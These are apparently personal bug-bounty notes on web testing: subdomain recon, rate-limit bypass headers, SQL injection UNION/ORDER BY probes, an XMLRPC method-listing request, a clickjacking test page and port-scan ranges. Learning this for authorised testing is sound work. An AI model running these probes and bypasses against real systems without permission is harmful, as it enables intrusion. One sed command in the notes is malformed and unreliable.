These are just some notes about "WEB" bug bounty. I use to write down stuff which I either learned by trying or by reading other people tweets/blogs. So technically I am not claiming to be the original author of these tips/tricks. I wrote down whatever seemed good to me.

Also I want to point out that I don't do web related bounties any more so it's possible I might have written down something wrong.

## Subdomains

- `assetfinder --subs-only [mocospace.com](http://mocospace.com/) | httprobe > hosts`
    - `meg --savestatus 200 /`
    - `cat out/index | cut -d' ' -f2`

- For deciding subdomains you can try to search on wolfram alpha
    - [https://www.wolframalpha.com/input/?i=quora.com](https://www.wolframalpha.com/input/?i=quora.com)

## Rate limit testing

- First just capture in burp and see if you can repeat it.
- Try to add `X-Forwarded-For` header.
- Try to add the `%00` at the end of the username of email whatever it is sending back for verification.

## For removing all the noise in Burp

- [https://gist.github.com/mzfr/84cb5ff2c11285f7fa3d0089a17859bf](https://gist.github.com/mzfr/84cb5ff2c11285f7fa3d0089a17859bf)
- [https://gist.github.com/mzfr/676d268bf58e602ca0e4b3798abe5ff8](https://gist.github.com/mzfr/676d268bf58e602ca0e4b3798abe5ff8)

# SQL Injection

## With Union

The best way is to find the number of column required in SQL injection is 

```bash
' order by 1--
```

And just like this increase the number until we get the error

Another way is:

```bash
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Remember that once using the `NULL` use it with the spaces and not with the `+` in between

## XMLRPC

If you find any XMLRPC then try to send the following payload

```bash
POST /xmlrpc.php HTTP/1.1
Host: Some Host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 131

<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

For refrence and further testing checkout the following report: [https://hackerone.com/reports/752073](https://hackerone.com/reports/752073)

## Host header injection

I think the best thing to use host header injection in general position would be to show internal information leakage

[https://hackerone.com/reports/548094](https://hackerone.com/reports/548094)

## Generating wordlist

```
git clone https://github.com/wikimedia/mediawiki.git

cd mediawiki/

ls -d -1 "./"**/* | sed '^\./' > mediawiki-wordlist
```

## Clickjacking

```html
<html>

<head>
    <title>Clickjack test page</title>
</head>

<body>
    <p>Website is vulnerable to clickjacking!</p>
    <iframe src="<vulnerable-URL>" width="1000" height="1000"></iframe>
</body>

</html>
```
# Port Scanning

- Best approach is
    - First run a 2 or 3 concurrent Masscan jobs with all 65535 ports split into 4-5 ranges.
    - Get a list of hosts and and a combined list of open ports from Masscan’s output.
    - Use these list as input to Nmap and do a regular Nmap scan.

## Range

```bash
1-13107
13108-26214
26215-39321
39322-52428
52429-65535
```

This is the range we should use.

* https://captmeelo.com/pentest/2019/07/29/port-scanning.html

## Links

- [https://gowsundar.gitbook.io/book-of-bugbounty-tips/](https://gowsundar.gitbook.io/book-of-bugbounty-tips/email-related)
